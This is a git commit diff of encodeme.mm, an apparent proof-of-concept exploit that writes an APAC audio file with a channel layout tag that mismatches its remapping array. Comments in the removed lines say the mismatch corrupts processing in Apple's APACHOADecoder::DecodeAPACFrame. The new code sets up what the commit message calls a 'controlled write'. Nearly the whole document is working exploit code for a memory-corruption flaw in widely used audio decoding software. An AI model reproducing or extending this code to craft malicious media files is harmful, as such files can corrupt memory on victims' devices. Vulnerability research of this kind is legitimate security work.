a37fce8b78cb700e24961125f2590f85ef5eb19e
Noah Weinberg <noahhw46@gmail.com>
2025-05-27 18:26:38 -0400

    update explanation and start of controlled write

--- encodeme.mm
+++ encodeme.mm
@@ -11,88 +11,93 @@ struct CodecConfig {
 };
 
 void OverrideApac(CodecConfig* config) {
-  //The mRemappingArray is sized based on the lower two bytes of mChannelLayoutTag.
-  //By creating a mismatch between them, a later stage of processing in APACHOADecoder::DecodeAPACFrame is corrupted.
-  //When the APACHOADecoder goes to process the APAC frame (permute it according to the channel remapping array), 
-  //for some reason it uses a permutation map that is the size given here in 
-  //mChannelLayoutTag, rather than just based on m_totalComponents. 
-  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8;
-  
-  for (int i = 0; i < 0x10000; i++) {
-    config->mRemappingArray.push_back(0xff);
-  }
+  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 13;
+  config->mRemappingArray.push_back(0x3);
 }
 
 int main() {
-  //This is the actual number of channels
-  uint32_t channelNum = 1;
-  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
-                                                                           channels:channelNum];
-  AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
-                                                .mFormatID = kAudioFormatAPAC,
-                                                .mFormatFlags = 0,
-                                                .mBytesPerPacket = 0,
-                                                .mFramesPerPacket = 0,
-                                                .mBytesPerFrame = 0,
-                                                .mChannelsPerFrame = channelNum,
-                                                .mBitsPerChannel = 0,
-                                                .mReserved = 0};
-  AVAudioChannelLayout* channelLayout =
-      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];
+    uint32_t channelNum = 12;
+    AVAudioChannelLayout* channelLayout =
+        [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | channelNum];
 
-  NSURL* outUrl = [NSURL fileURLWithPath:@"output.mp4"];
+    AVAudioFormat* formatIn = [[AVAudioFormat alloc] initWithCommonFormat:AVAudioPCMFormatInt32
+                                                              sampleRate:44100
+                                                             interleaved:YES
+                                                            channelLayout:channelLayout];
 
-  OSStatus status = 0;
+    AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
+                                                  .mFormatID = kAudioFormatAPAC,
+                                                  .mFormatFlags = 0,
+                                                  .mBytesPerPacket = 0,
+                                                  .mFramesPerPacket = 0,
+                                                  .mBytesPerFrame = 0,
+                                                  .mChannelsPerFrame = channelNum,
+                                                  .mBitsPerChannel = 0,
+                                                  .mReserved = 0};
 
-  ExtAudioFileRef audioFile = nullptr;
-  status =
-      ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type, &outputDescription,
-                                channelLayout.layout, kAudioFileFlags_EraseFile, &audioFile);
-  if (status) {
-    fprintf(stderr, "error creating file: %x\n", status);
-    return 1;
-  }
 
-  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
-                                   sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
-  if (status) {
-    fprintf(stderr, "error writing audiofile: %x\n", status);
-    return 1;
-  }
-  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
-                                   sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
-  if (status) {
-    fprintf(stderr, "error writing audiofile: %x\n", status);
-    return 1;
-  }
-  
-  //This is actually unnecessary for just the PoC.
-  float audioBuffer[44100];
-  for (int i = 0; i < 44100; ++i) {
-      audioBuffer[i] = 0.5f;
-  }
-  AudioBufferList audioBufferList{
-      .mNumberBuffers = 1,
-      .mBuffers =
-          {
-              {
-                  .mNumberChannels = 1,
-                  .mDataByteSize = sizeof(audioBuffer),
-                  .mData = audioBuffer,
-              },
-          },
-  };
-  status =
-      ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
-  if (status) {
-    fprintf(stderr, "error writing audiofile: %x\n", status);
-    return 1;
-  }
-  status = ExtAudioFileDispose(audioFile);
-  if (status) {
-    fprintf(stderr, "error closing audiofile: %x\n", status);
-    return 1;
-  }
-  audioFile = nullptr;
-  return 0;
+    NSURL* outUrl = [NSURL fileURLWithPath:@"output.caf"];
+
+    OSStatus status = 0;
+
+    ExtAudioFileRef audioFile = nullptr;
+    status =
+        ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileCAFType, &outputDescription,
+                                  channelLayout.layout, kAudioFileFlags_EraseFile, &audioFile);
+    if (status) {
+        fprintf(stderr, "error ExtAudioFileCreateWithURL: %d\n", status);
+        return 1;
+    }
+
+    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
+                                     sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
+    if (status) {
+        fprintf(stderr, "error ExtAudioFileSetProperty: %d\n", status);
+        return 1;
+    }
+    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
+                                     sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
+    if (status) {
+        fprintf(stderr, "error ExtAudioFileSetProperty: %d\n", status);
+        return 1;
+    }
+
+    const int frameCount = 44100;
+    const int bufferSize = 44100 * channelNum;
+    int* audioBuffer = new int[bufferSize]();
+
+    for (int frame = 0; frame < frameCount; frame++) {
+        for (int ch = 0; ch < channelNum; ch++) {
+            audioBuffer[frame * channelNum + ch] = 0xff; 
+        }
+    }
+
+
+    AudioBufferList audioBufferList{
+        .mNumberBuffers = 1,
+        .mBuffers =
+            {
+                {
+                    .mNumberChannels = channelNum,
+                    .mDataByteSize = static_cast<UInt32>(bufferSize * sizeof(int)),
+                    .mData = audioBuffer,
+                },
+            },
+    };
+    
+    status = ExtAudioFileWrite(audioFile, frameCount, &audioBufferList);
+    if (status) {
+        fprintf(stderr, "error ExtAudioFileWrite: %d\n", status);
+        delete[] audioBuffer;
+        return 1;
+    }
+    
+    status = ExtAudioFileDispose(audioFile);
+    if (status) {
+        fprintf(stderr, "error ExtAudioFileDispose: %d\n", status);
+    }
+    
+    delete[] audioBuffer;
+    audioFile = nullptr;
+    return 0;
 }
